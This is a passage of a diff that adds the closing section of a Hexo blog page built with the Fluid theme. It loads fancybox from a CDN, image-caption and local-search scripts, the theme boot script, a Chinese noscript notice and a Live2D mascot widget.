+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body>
+</html>
